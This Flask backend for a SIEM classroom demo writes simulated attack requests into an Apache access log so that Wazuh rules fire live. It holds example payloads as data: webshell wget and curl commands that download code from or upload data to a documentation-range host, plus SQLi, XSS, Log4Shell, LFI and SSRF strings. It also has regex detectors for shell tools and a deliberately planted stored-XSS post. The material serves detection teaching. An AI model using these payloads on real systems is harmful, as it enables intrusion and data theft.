#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ============================================================================
# SIEM Lab - live demo backend (Flask)
# Serves the intranet mockup and turns the console buttons into REAL access.log
# writes so the existing Wazuh rules fire live during a lecture.
# IMPORTANT: no endpoint EVER executes a system command. Each endpoint only
# formats Combined-format log line(s) (identical shape to the planted dataset)
# and appends them to access.log. Pure file I/O — completely inert.
# ============================================================================
import os, random
from datetime import datetime, timedelta, timezone
from flask import Flask, jsonify, request, send_from_directory

APP_DIR    = os.path.dirname(os.path.abspath(__file__))
ACCESS_LOG = os.environ.get("DEMO_ACCESS_LOG", "/var/log/apache2/access.log")
KST = timezone(timedelta(hours=9))

# One external attacker address drives the whole live kill-chain, so the
# instructor can filter Wazuh by a single IP and watch the story unfold.
ATTACKER   = "203.0.113.66"           # RFC 5737 doc range (matches dataset)
PAYLOAD_SRV = "198.51.100.47"
UA_ATTACK  = "Mozilla/5.0 (X11; Linux x86_64) curl/7.81.0"
UA_SQLMAP  = "sqlmap/1.7.2#stable (https://sqlmap.org)"
UA_NORMAL  = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
             "(KHTML, like Gecko) Chrome/126.0 Safari/537.36")
NORMAL_PATHS = ["/portal/dashboard", "/portal/notices", "/index.html",
                "/api/status", "/docs/guide.html", "/portal/calendar",
                "/portal/board/free", "/api/v1/notices"]

app = Flask(__name__, static_folder=None)

def now_apache():
    return datetime.now(tz=KST).strftime("%d/%b/%Y:%H:%M:%S %z")

def combined(ip, method, path, status, size, ua, referer="-"):
    return (f'{ip} - - [{now_apache()}] "{method} {path} HTTP/1.1" '
            f'{status} {size} "{referer}" "{ua}"')

def append_lines(lines):
    """Append pre-formatted log lines. No shell, no exec — just file I/O."""
    with open(ACCESS_LOG, "a", encoding="utf-8") as f:
        for l in lines:
            f.write(l + "\n")

def anat_of(method, path, ip):
    """Break an HTTP request into 'where/how' parts so learners SEE the attack:
    대상 페이지 · 메서드 · 주입 위치 · 페이로드 · 출발지."""
    from urllib.parse import unquote_plus
    page = path.split("?", 1)[0]
    vector, payload = "-", "-"
    if "?" in path:
        qs = path.split("?", 1)[1]
        if "=" in qs:
            k, v = qs.split("=", 1)
            vector = f"{k}= 파라미터"
            payload = unquote_plus(v)
        else:
            vector, payload = "쿼리스트링", qs
    return dict(page=page, method=method, vector=vector, payload=payload, src=ip)

# --- attack scenarios: each writes access.log line(s) that fire a Wazuh rule --- #
# req items: (method, path, status, size)
SCENARIOS = {
 "webshell": dict(
    label="① 웹셸 명령 실행", stage="실행",
    ip=ATTACKER, ua=UA_ATTACK, rule="100101", color="suspect",
    entry="통합 검색창(취약한 search.php) — 검색어가 서버 명령으로 실행됨",
    req=[("GET", "/search.php?cmd=id", 200, 120)],
    detail="웹셸을 통한 원격 명령 실행(cmd=id)",
    expect="rule.id 100101 · 웹셸 명령 실행 시도"),
 "download": dict(
    label="② 페이로드 다운로드", stage="다운로드",
    ip=ATTACKER, ua=UA_ATTACK, rule="100101", color="suspect",
    entry="이미 심어진 웹셸(search.php)의 cmd= 파라미터",
    req=[("GET", f"/search.php?cmd=wget+http://{PAYLOAD_SRV}/kworker+-O+/tmp/.cache/kworker", 200, 90)],
    detail="웹셸로 악성 파일 다운로드(cmd=wget)",
    expect="rule.id 100101 · 악성 페이로드 다운로드"),
 "exfil": dict(
    label="③ 정보 유출", stage="유출",
    ip=ATTACKER, ua=UA_ATTACK, rule="100101", color="suspect",
    entry="웹셸(search.php)의 cmd= 파라미터",
    req=[("GET", f"/search.php?cmd=curl+-T+/tmp/loot.tgz+http://{PAYLOAD_SRV}/up", 200, 80)],
    detail="압축 파일 외부 업로드(cmd=curl -T)",
    expect="rule.id 100101 · 외부로 데이터 유출"),
 "scanner": dict(
    label="웹 취약점 스캐너", stage="정찰",
    ip=ATTACKER, ua=UA_SQLMAP, rule="100102", color="warn",
    entry="사이트 전역 — 자동화 도구가 존재하지 않는 URL을 무작위로 훑음",
    req=[("GET", "/index.php?id=1+AND+1=1", 404, 330), ("GET", "/admin.php", 404, 300),
         ("GET", "/.env", 404, 280), ("GET", "/phpmyadmin/", 404, 300),
         ("GET", "/wp-login.php", 404, 290)],
    detail="sqlmap 스캐너 정찰(다수 404)",
    expect="rule.id 100102 · 웹 스캐너 탐지"),
 "flood": dict(
    label="로그인 반복 시도", stage="무차별",
    ip=ATTACKER, ua=UA_ATTACK, rule="5710 계열", color="warn",
    entry="로그인 폼 — 같은 IP가 짧은 간격으로 반복 로그인 시도",
    req=[("GET", f"/portal/login?try={i}", 401, 210) for i in range(15)],
    detail="짧은 간격 로그인 반복(15건)",
    expect="반복 인증 실패 패턴"),
 "traversal": dict(
    label="디렉터리 트래버설", stage="정찰·접근",
    ip=ATTACKER, ua=UA_ATTACK, rule="웹 공격(Path Traversal)", color="warn",
    entry="문서함 '파일 다운로드' 링크의 file= 파라미터",
    req=[("GET", "/download?file=../../../../etc/passwd", 403, 210),
         ("GET", "/download?file=..%2f..%2f..%2f..%2fetc%2fpasswd", 403, 210),
         ("GET", "/static/../../../etc/shadow", 403, 190)],
    detail="경로 조작(../)으로 시스템 파일 접근 시도",
    expect="식별 신호: 경로에 ../ 또는 인코딩된 ..%2f, /etc/passwd·/etc/shadow"),
 # ---- 다양한 웹 공격 유형 (로그로 식별하는 법 학습) ---------------------------- #
 "sqli": dict(
    label="SQL 인젝션", stage="웹 공격",
    ip=ATTACKER, ua=UA_ATTACK, rule="웹 공격(SQLi)", color="warn",
    entry="로그인 폼의 아이디 입력란 · 상품 조회 페이지의 id= 파라미터",
    req=[("GET", "/product?id=1'+OR+'1'='1", 200, 512),
         ("GET", "/product?id=1+UNION+SELECT+username,password+FROM+users--", 200, 660),
         ("GET", "/login?user=admin'--+-", 200, 320)],
    detail="파라미터에 SQL 구문 주입(' OR '1'='1 · UNION SELECT)",
    expect="식별 신호: 값에 따옴표('), UNION SELECT, 주석(--), OR 1=1, ; 등 SQL 키워드"),
 "xss": dict(
    label="XSS (반사형)", stage="웹 공격",
    ip=ATTACKER, ua=UA_ATTACK, rule="웹 공격(XSS)", color="warn",
    entry="통합 검색창 · 프로필 이름 입력란 (게시판 댓글은 '저장형' XSS)",
    req=[("GET", "/search?q=<script>alert(document.cookie)</script>", 200, 420),
         ("GET", "/profile?name=<img+src=x+onerror=alert(1)>", 200, 400)],
    detail="URL 파라미터에 스크립트 주입(반사형 XSS)",
    expect="식별 신호: 파라미터에 <script>, onerror=, onload=, javascript:, <img/<svg"),
 "cmdi": dict(
    label="OS 명령어 주입", stage="웹 공격",
    ip=ATTACKER, ua=UA_ATTACK, rule="웹 공격(Command Injection)", color="warn",
    entry="헬프데스크 '네트워크 진단' 도구의 host·domain 입력란",
    req=[("GET", "/ping?host=127.0.0.1;id", 200, 300),
         ("GET", "/tools?cmd=cat+/etc/passwd", 200, 340),
         ("GET", "/dns?domain=a.com|whoami", 200, 300)],
    detail="파라미터에 OS 명령을 연결(; | && `)",
    expect="식별 신호: 값에 셸 구분자(; | && `), /etc/passwd, id·whoami·cat 같은 명령"),
 "lfi": dict(
    label="파일 인클루전(LFI)", stage="웹 공격",
    ip=ATTACKER, ua=UA_ATTACK, rule="웹 공격(LFI/RFI)", color="warn",
    entry="문서·페이지 뷰어의 page=·file= 파라미터",
    req=[("GET", "/index.php?page=/etc/passwd", 200, 520),
         ("GET", "/view?file=php://filter/convert.base64-encode/resource=config.php", 200, 500),
         ("GET", "/inc?tpl=http://198.51.100.47/shell.txt", 200, 340)],
    detail="include 파라미터로 시스템 파일·원격 소스 로드 시도",
    expect="식별 신호: page=/file=/tpl= 값에 /etc/passwd, php://filter, http:// (원격 포함)"),
 "log4shell": dict(
    label="Log4Shell (JNDI)", stage="웹 공격",
    ip=ATTACKER, ua=UA_ATTACK, rule="웹 공격(Log4Shell)", color="suspect",
    entry="로그로 남는 모든 입력 — 검색어·User-Agent 헤더·API 파라미터",
    req=[("GET", "/api/status?debug=${jndi:ldap://203.0.113.66:1389/a}", 200, 220),
         ("GET", "/api/user?x=${jndi:dns://203.0.113.66/b}", 200, 210)],
    detail="파라미터·헤더에 JNDI 룩업 주입(Log4Shell, CVE-2021-44228)",
    expect="식별 신호: 요청 어디든 ${jndi:ldap://…} · ${jndi:dns:…} · ${jndi:rmi:…}"),
 "ssrf": dict(
    label="SSRF", stage="웹 공격",
    ip=ATTACKER, ua=UA_ATTACK, rule="웹 공격(SSRF)", color="warn",
    entry="URL 미리보기·이미지 가져오기 기능의 url=·target= 입력란",
    req=[("GET", "/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/", 200, 300),
         ("GET", "/proxy?target=http://127.0.0.1:6379/", 200, 260)],
    detail="서버가 내부·클라우드 메타데이터로 요청하게 유도(SSRF)",
    expect="식별 신호: url=/target= 값에 169.254.169.254(메타데이터), 127.0.0.1·localhost·내부 IP"),
}

# ---- static ---------------------------------------------------------------- #
@app.route("/")
def index():
    return send_from_directory(APP_DIR, "live_demo_target_site.html")

@app.route("/demo/config")
def demo_config():
    return jsonify(attacker=ATTACKER, access_log=ACCESS_LOG,
                   scenarios={k: {"label": v["label"], "stage": v["stage"],
                                  "rule": v["rule"], "color": v["color"],
                                  "expect": v["expect"]} for k, v in SCENARIOS.items()})

# ---- demo endpoints (log-only, no command execution) ----------------------- #
@app.route("/demo/normal", methods=["POST"])
def demo_normal():
    ip = f"192.168.208.{random.randint(100,240)}"
    path = random.choice(NORMAL_PATHS)
    line = combined(ip, "GET", path, 200, random.randint(400, 6000), UA_NORMAL)
    append_lines([line])
    return jsonify(detail="정상 직원 트래픽 1건", added=1, lines=[line],
                   rule="탐지 없음(정상)", ip=ip, expect="정상 트래픽 — 알림 없음",
                   anat=anat_of("GET", path, ip))

@app.route("/demo/act/<name>", methods=["POST"])
def demo_act(name):
    sc = SCENARIOS.get(name)
    if not sc:
        return jsonify(error="unknown scenario"), 404
    lines = [combined(sc["ip"], m, p, s, sz, sc["ua"]) for (m, p, s, sz) in sc["req"]]
    append_lines(lines)
    m0, p0 = sc["req"][0][0], sc["req"][0][1]
    return jsonify(detail=sc["detail"], added=len(lines), lines=lines,
                   rule=sc["rule"], ip=sc["ip"], expect=sc["expect"], entry=sc.get("entry", ""),
                   ua=sc["ua"], anat=anat_of(m0, p0, sc["ip"]))

# --- interactive attack surfaces: search box (RCE-ish) + board (stored XSS) --- #
import re, html
CMD_PAT = re.compile(r"(;|\||&&|`|\$\(|\bid\b|\bwhoami\b|\buname\b|\bcat\b|\bwget\b|"
                     r"\bcurl\b|\bnc\b|\bbash\b|/etc/passwd|cmd=)", re.I)
XSS_PAT = re.compile(r"(<script|onerror\s*=|onload\s*=|javascript:|<img|<svg|<iframe|"
                     r"document\.cookie|alert\s*\()", re.I)
SQLI_PAT = re.compile(r"('|--|\bor\b\s+['\"\d]|\bunion\b|\bselect\b|1\s*=\s*1|;|\bdrop\b)", re.I)
BADFILE_PAT = re.compile(r"\.(php\d?|phtml|jsp|jspx|asp|aspx|sh|cgi|pl|exe|bat|war)$", re.I)
DEMO_USER = os.environ.get("DEMO_LOGIN_USER", "khw")
DEMO_PASS = os.environ.get("DEMO_LOGIN_PASS", "bridge2026")

def _ts():
    return datetime.now(tz=KST).strftime("%m-%d %H:%M")

# in-memory board; seeded with normal posts + ONE hidden stored-XSS payload so
# students can hunt the planted vulnerability. Bodies are rendered as raw HTML
# on the (intentionally vulnerable) target page — that IS the stored-XSS lesson.
BOARD = [
 dict(id=1, author="이수민 사원", body="워크숍 자료 공유 감사합니다. 잘 봤어요!", ts=_ts(), xss=False),
 dict(id=2, author="박준영 대리", body="3분기 회의실 예약은 어디서 하나요?", ts=_ts(), xss=False),
 dict(id=3, author="guest_7f2c",
      body='좋은 정보네요 <img src=x onerror="document.getElementById(\'xss-flag\')&&(document.getElementById(\'xss-flag\').textContent=\'⚠ 저장형 XSS 실행됨 (guest_7f2c)\')">',
      ts=_ts(), xss=True),   # <-- 숨겨진 저장형 XSS
 dict(id=4, author="정민지 과장", body="다음 배포 일정도 공지 부탁드립니다.", ts=_ts(), xss=False),
]

@app.route("/demo/search", methods=["POST"])
def demo_search():
    q = (request.json or {}).get("q", "").strip()[:200]
    if not q:
        return jsonify(error="검색어를 입력하세요"), 400
    attack = bool(CMD_PAT.search(q))
    if attack:   # search box is the webshell entry point -> log as cmd= (rule 100101)
        from urllib.parse import quote
        line = combined(ATTACKER, "GET", f"/search.php?cmd={quote(q, safe='')}", 200, 120, UA_ATTACK)
        append_lines([line])
        return jsonify(flagged=True, rule="100101", ip=ATTACKER, echo=q,
                       detail="검색창에 시스템 명령이 주입되었습니다(웹셸 패턴).",
                       expect="rule.id 100101 · 웹셸 명령 실행 시도", lines=[line],
                       anat=dict(page="/search.php", method="GET", vector="cmd= 파라미터(검색 입력)",
                                 payload=q, src=ATTACKER))
    ip = f"192.168.208.{random.randint(100,240)}"
    line = combined(ip, "GET", f"/search.php?q={q}", 200, random.randint(300,1500), UA_NORMAL)
    append_lines([line])
    return jsonify(flagged=False, rule="탐지 없음", ip=ip, echo=q,
                   detail="정상 검색 요청으로 처리되었습니다.", expect="정상 트래픽", lines=[line],
                   anat=dict(page="/search.php", method="GET", vector="q= 파라미터", payload=q, src=ip))

@app.route("/demo/board", methods=["GET", "POST"])
def demo_board():
    if request.method == "POST":
        d = request.json or {}
        author = html.escape((d.get("author", "") or "익명").strip()[:40]) or "익명"
        body   = (d.get("body", "") or "").strip()[:500]
        if not body:
            return jsonify(error="내용을 입력하세요"), 400
        xss = bool(XSS_PAT.search(body))
        BOARD.append(dict(id=(BOARD[-1]["id"]+1 if BOARD else 1),
                          author=author, body=body, ts=_ts(), xss=xss))
        # log the write attempt (note: POST bodies are NOT in access.log by default —
        # a teaching point that not every attack is visible in the web access log)
        line = combined(ATTACKER if xss else f"192.168.208.{random.randint(100,240)}",
                        "POST", "/board/write", 200, 90, UA_ATTACK if xss else UA_NORMAL)
        append_lines([line])
        return jsonify(ok=True, xss=xss,
                       rule=("저장형 XSS(웹 로그 미탐)" if xss else "탐지 없음"),
                       expect=("브라우저에서 스크립트 실행 — 접근 로그로는 탐지 어려움" if xss else "정상"),
                       detail=("저장형 XSS 페이로드가 게시글로 저장되었습니다." if xss
                               else "정상 게시글이 등록되었습니다."),
                       anat=dict(page="/board/write", method="POST",
                                 vector="게시글 본문(저장형 stored)", payload=body[:120],
                                 src=(ATTACKER if xss else "내부 사용자")),
                       note=("POST 본문은 access.log의 URL에 남지 않습니다 — "
                             "웹 접근 로그만으론 XSS 본문을 못 볼 수 있습니다(앱/WAF 로그 필요)."))
    return jsonify(posts=BOARD)

@app.route("/demo/login", methods=["POST"])
def demo_login():
    """Real-ish login. SQLi payload in the fields = injection attempt(logged as
    attacker). Wrong creds = 401 (brute-force surface). Right creds = success."""
    from urllib.parse import quote
    d = request.json or {}
    u = (d.get("username", "") or "").strip()[:60]
    p = (d.get("password", "") or "")[:60]
    if SQLI_PAT.search(u) or SQLI_PAT.search(p):
        line = combined(ATTACKER, "GET", f"/login?username={quote(u, safe='')}", 200, 120, UA_ATTACK)
        append_lines([line])
        return jsonify(result="sqli", detail="로그인 폼에 SQL 인젝션 패턴이 감지되었습니다.",
                       expect="SQL 인젝션 시도 — 웹 접근 로그에 payload 노출",
                       anat=dict(page="/login", method="GET", vector="username 파라미터(SQLi)",
                                 payload=u, src=ATTACKER))
    if u == DEMO_USER and p == DEMO_PASS:
        ip = f"192.168.208.{random.randint(100,240)}"
        append_lines([combined(ip, "POST", "/login", 302, 0, UA_NORMAL)])
        return jsonify(result="ok", user="김현우 대리", detail="로그인 성공")
    # failed -> 401 (repeat = brute force)
    append_lines([combined(ATTACKER, "POST", "/login", 401, 0, UA_ATTACK)])
    return jsonify(result="fail", detail="아이디 또는 비밀번호가 올바르지 않습니다.",
                   expect="인증 실패 401 — 반복되면 무차별 대입(brute force)")

@app.route("/demo/upload", methods=["POST"])
def demo_upload():
    """File attach. Executable extensions = webshell upload (attacker uploads then
    accesses /uploads/shell.php?cmd=...) -> rule 100101. Others = benign."""
    from urllib.parse import quote
    fn = ((request.json or {}).get("filename", "") or "").strip()[:120]
    if not fn:
        return jsonify(error="파일을 선택하세요"), 400
    if BADFILE_PAT.search(fn):
        append_lines([combined(ATTACKER, "POST", "/upload", 200, 90, UA_ATTACK),
                      combined(ATTACKER, "GET", f"/uploads/{quote(fn, safe='')}?cmd=id", 200, 120, UA_ATTACK)])
        return jsonify(flagged=True, rule="100101",
                       detail="실행 가능한 스크립트 파일이 업로드되었습니다 (웹셸 업로드 시도).",
                       expect="rule.id 100101 · 업로드된 웹셸에 cmd= 접근",
                       anat=dict(page="/uploads/"+fn, method="POST→GET", vector="파일 업로드(확장자 검증 우회)",
                                 payload=fn, src=ATTACKER))
    ip = f"192.168.208.{random.randint(100,240)}"
    append_lines([combined(ip, "POST", "/upload", 200, 90, UA_NORMAL)])
    return jsonify(flagged=False, rule="탐지 없음", detail="파일이 정상 첨부되었습니다.",
                   anat=dict(page="/upload", method="POST", vector="파일 첨부", payload=fn, src=ip))

@app.route("/demo/visit", methods=["POST"])
def demo_visit():
    """A student clicking around the mockup generates realistic normal traffic."""
    path = ((request.json or {}).get("path", "/") or "/")[:120]
    ip = f"192.168.208.{random.randint(100,240)}"
    line = combined(ip, "GET", path, 200, random.randint(400, 6000), UA_NORMAL)
    append_lines([line])
    return jsonify(ok=True, line=line)

@app.route("/demo/ticket", methods=["POST"])
def demo_ticket():
    """Helpdesk 1:1 문의 — another user input surface. Command-injection in the
    ticket body is logged as a webshell-style request (rule 100101)."""
    d = request.json or {}
    body = (d.get("body", "") or "").strip()[:200]
    if not body:
        return jsonify(error="문의 내용을 입력하세요"), 400
    attack = bool(CMD_PAT.search(body))
    if attack:
        from urllib.parse import quote
        line = combined(ATTACKER, "GET", f"/helpdesk/run?cmd={quote(body, safe='')}", 200, 120, UA_ATTACK)
        append_lines([line])
        return jsonify(flagged=True, rule="100101", detail="헬프데스크 문의에 명령이 주입되었습니다.",
                       expect="rule.id 100101 · 웹셸 명령 실행 시도",
                       anat=dict(page="/helpdesk/run", method="GET", vector="cmd= 파라미터(문의 입력)",
                                 payload=body, src=ATTACKER))
    ip = f"192.168.208.{random.randint(100,240)}"
    line = combined(ip, "POST", "/helpdesk/ticket", 200, 90, UA_NORMAL)
    append_lines([line])
    return jsonify(flagged=False, rule="탐지 없음", detail="문의가 정상 접수되었습니다.",
                   anat=dict(page="/helpdesk/ticket", method="POST", vector="문의 본문", payload=body, src=ip))

@app.route("/demo/log")
def demo_log():
    n = min(int(request.args.get("n", 16)), 60)
    try:
        with open(ACCESS_LOG, "r", encoding="utf-8", errors="replace") as f:
            tail = f.read().splitlines()[-n:]
    except FileNotFoundError:
        tail = []
    return jsonify(lines=tail)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("DEMO_PORT", "8080")))
